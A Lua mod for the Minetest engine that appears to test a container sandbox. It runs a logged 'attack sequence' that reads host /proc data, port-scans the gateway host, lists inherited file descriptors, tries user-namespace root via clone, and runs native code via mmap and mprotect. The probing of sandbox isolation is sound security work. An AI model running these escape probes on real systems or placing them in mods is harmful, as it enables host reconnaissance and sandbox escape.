local IE = minetest.request_insecure_environment()
if not IE then
    minetest.log("error", "[EVILMOD] insecure env unavailable — add evilmod to secure.trusted_mods")
    return
end

local ffi_ok, ffi = pcall(require, "ffi")

local function probe(name, fn)
    local ok, result = pcall(fn)
    local line = ok and result or ("[LUA ERROR] " .. tostring(result))
    minetest.log("action", string.format("[EVILMOD] %-50s %s", name, line))
end

minetest.after(3, function()
    minetest.log("action", "[EVILMOD] ========== ATTACK SEQUENCE START ==========")

    -- [Attack 1] PID namespace escape: missing CLONE_NEWPID exposes full host /proc tree.
    probe("PID ns — /proc/1/comm (host init visible?)", function()
        local f = IE.io.open("/proc/1/comm", "r")
        if not f then return "[CONTAINED] cannot open /proc/1/comm" end
        local comm = f:read("*a"):gsub("%s+", "")
        f:close()
        return string.format("[ESCAPED] PID 1 on host is '%s'", comm)
    end)

    probe("PID ns — total host PIDs via /proc/loadavg", function()
        local f = IE.io.open("/proc/loadavg", "r")
        if not f then return "[CONTAINED] cannot read /proc/loadavg" end
        local line = f:read("*a")
        f:close()
        local total = line:match("%d+/(%d+)")
        if total and tonumber(total) > 5 then
            return string.format("[ESCAPED] /proc/loadavg shows %s host processes", total)
        end
        return string.format("[CONTAINED] process count looks isolated: %s", tostring(total))
    end)

    probe("PID ns — read parent (container manager) cmdline", function()
        local sf = IE.io.open("/proc/self/status", "r")
        if not sf then return "[CONTAINED] cannot read /proc/self/status" end
        local ppid
        for line in sf:lines() do
            ppid = line:match("^PPid:%s*(%d+)")
            if ppid then break end
        end
        sf:close()
        if not ppid then return "[CONTAINED] could not parse PPID" end

        local cf = IE.io.open("/proc/" .. ppid .. "/cmdline", "r")
        if not cf then
            return string.format("[CONTAINED] PPID=%s cmdline unreadable", ppid)
        end
        local cmdline = cf:read("*a"):gsub("%z", " "):gsub("%s+$", "")
        cf:close()
        return string.format("[ESCAPED] PPID=%s cmd='%s'", ppid, cmdline)
    end)

    -- [Attack 2] IPC namespace escape: missing CLONE_NEWIPC shares host SysV IPC objects.
    probe("IPC ns — /proc/sysvipc/shm visible", function()
        local f = IE.io.open("/proc/sysvipc/shm", "r")
        if not f then return "[CONTAINED] cannot open /proc/sysvipc/shm" end
        local lines = 0
        for _ in f:lines() do lines = lines + 1 end
        f:close()
        return string.format("[ESCAPED] sysvipc/shm accessible (%d lines incl. header)", lines)
    end)

    probe("IPC ns — /proc/sysvipc/sem visible", function()
        local f = IE.io.open("/proc/sysvipc/sem", "r")
        if not f then return "[CONTAINED] cannot open /proc/sysvipc/sem" end
        local lines = 0
        for _ in f:lines() do lines = lines + 1 end
        f:close()
        return string.format("[ESCAPED] sysvipc/sem accessible (%d lines)", lines)
    end)

    -- [Attack 3] Network: no INPUT rule lets container reach host services via raw socket FFI.
    probe("Network — reach host 172.18.0.1 (raw socket)", function()
        if not ffi_ok then return "[SKIP] LuaJIT FFI unavailable" end

        ffi.cdef[[
            int socket(int domain, int type, int protocol);
            int connect(int sockfd, const void *addr, unsigned int addrlen);
            int close(int fd);
        ]]

        local AF_INET     = 2
        local SOCK_STREAM = 1
        local host_ip     = ffi.new("uint8_t[4]", {172, 18, 0, 1})

        local open_ports = {}
        for _, port in ipairs({22, 80, 443, 8080, 3000, 5000, 6379, 5432}) do
            local sockaddr = ffi.new("uint8_t[16]")
            sockaddr[0] = 2; sockaddr[1] = 0
            sockaddr[2] = bit.rshift(port, 8)
            sockaddr[3] = bit.band(port, 0xff)
            ffi.copy(sockaddr + 4, host_ip, 4)

            local fd = ffi.C.socket(AF_INET, SOCK_STREAM, 0)
            if fd >= 0 then
                local r = ffi.C.connect(fd, sockaddr, 16)
                ffi.C.close(fd)
                if r == 0 then
                    open_ports[#open_ports + 1] = tostring(port)
                end
            end
        end

        if #open_ports > 0 then
            return "[ESCAPED] host ports reachable from container: " .. table.concat(open_ports, ",")
        end
        return "[ESCAPED] gateway reachable but no standard ports open on host"
    end)

    -- [Attack 4] FD inheritance: fds above 2 survive fork+exec without os.closerange.
    probe("FD inheritance — unexpected open fds", function()
        local leaked = {}
        for i = 3, 63 do
            local f = IE.io.open("/proc/self/fd/" .. i, "r")
            if f then
                f:close()
                local info = IE.io.open("/proc/self/fdinfo/" .. i, "r")
                local detail = "fd" .. i
                if info then
                    local pos = info:read("*l") or ""
                    info:close()
                    detail = detail .. "(" .. pos:sub(1, 40) .. ")"
                end
                leaked[#leaked + 1] = detail
            end
        end
        if #leaked > 0 then
            return "[ESCAPED] inherited fds: " .. table.concat(leaked, " | ")
        end
        return "[CONTAINED] no fds beyond stdin/stdout/stderr"
    end)

    -- [Attack 5] User namespace: clone(CLONE_NEWUSER) unfiltered in seccomp lets process become UID 0.
    probe("User ns — clone(CLONE_NEWUSER) succeeds", function()
        if not ffi_ok then return "[SKIP] LuaJIT FFI unavailable" end

        ffi.cdef[[
            long syscall(long number, ...);
        ]]

        local CLONE_NEWUSER = 0x10000000
        local SYS_clone     = 56
        local SYS_exit      = 60

        local pid = ffi.C.syscall(SYS_clone, CLONE_NEWUSER, 0, nil, nil, 0)

        if pid < 0 then
            return "[CONTAINED] clone(CLONE_NEWUSER) blocked: errno=" .. tostring(-tonumber(pid))
        end

        if pid == 0 then
            local uid_map = IE.io.open("/proc/self/uid_map", "w")
            local success = false
            if uid_map then
                uid_map:write("0 65534 1\n")
                uid_map:close()
                local sf = IE.io.open("/proc/self/status", "r")
                if sf then
                    for line in sf:lines() do
                        local u = line:match("^Uid:%s*(%d+)")
                        if u and tonumber(u) == 0 then success = true; break end
                    end
                    sf:close()
                end
            end
            ffi.C.syscall(SYS_exit, success and 0 or 2)
            return ""
        end

        ffi.cdef[[ int waitpid(int pid, int *wstatus, int options); ]]
        local ws = ffi.new("int[1]")
        ffi.C.waitpid(pid, ws, 0)
        local exit_code = math.floor(ws[0] / 256) % 256

        if exit_code == 0 then
            return "[ESCAPED] clone(CLONE_NEWUSER) succeeded — child became UID 0 in new user namespace"
        elseif exit_code == 2 then
            return "[ESCAPED] clone(CLONE_NEWUSER) created namespace but uid_map write failed (partial escape)"
        end
        return "[CONTAINED] clone succeeded but could not become root in new namespace"
    end)

    -- [Attack 6] No network namespace: CLONE_NEWNET conditional exposes host /proc/net when --port is omitted.
    probe("Net ns — host connections visible (run without --port)", function()
        local tcp_f = IE.io.open("/proc/net/tcp", "r")
        if not tcp_f then return "[CONTAINED] cannot read /proc/net/tcp" end
        local tcp_entries = -1  -- subtract header line
        for _ in tcp_f:lines() do tcp_entries = tcp_entries + 1 end
        tcp_f:close()

        local unix_entries = -1
        local ux_f = IE.io.open("/proc/net/unix", "r")
        if ux_f then
            for _ in ux_f:lines() do unix_entries = unix_entries + 1 end
            ux_f:close()
        end

        if tcp_entries > 3 or unix_entries > 5 then
            return string.format(
                "[ESCAPED] host net namespace shared: %d TCP connections, %d Unix sockets",
                tcp_entries, unix_entries
            )
        end
        return string.format(
            "[CONTAINED] isolated net namespace (%d TCP, %d Unix)",
            tcp_entries, unix_entries
        )
    end)

    -- [Attack 7] Seccomp mprotect bypass: PROT_EXEC unfiltered allows arbitrary native code execution.
    probe("Seccomp — mprotect(PROT_EXEC) not filtered", function()
        if not ffi_ok then return "[SKIP] LuaJIT FFI unavailable" end

        ffi.cdef[[
            void *mmap(void *addr, size_t length, int prot, int flags, int fd, long offset);
            int   mprotect(void *addr, size_t len, int prot);
            int   munmap(void *addr, size_t length);
        ]]

        local PROT_READ   = 1
        local PROT_WRITE  = 2
        local PROT_EXEC   = 4
        local MAP_PRIVATE = 0x02
        local MAP_ANON    = 0x20

        local page = ffi.C.mmap(nil, 4096, PROT_READ + PROT_WRITE, MAP_PRIVATE + MAP_ANON, -1, 0)
        if page == ffi.cast("void*", ffi.cast("intptr_t", -1)) then
            return "[CONTAINED] mmap failed"
        end

        local code = ffi.cast("uint8_t*", page)
        code[0] = 0x90  -- NOP
        code[1] = 0x90  -- NOP
        code[2] = 0xc3  -- RET

        local rc = ffi.C.mprotect(page, 4096, PROT_READ + PROT_EXEC)
        if rc ~= 0 then
            ffi.C.munmap(page, 4096)
            return "[CONTAINED] mprotect(PROT_EXEC) blocked by seccomp or kernel"
        end

        local fn = ffi.cast("void (*)(void)", page)
        fn()

        ffi.C.munmap(page, 4096)
        return "[ESCAPED] Allocated and executed arbitrary native code (mmap+mprotect allowed)"
    end)

    minetest.log("action", "[EVILMOD] ========== ATTACK ENDED ==========")
end)
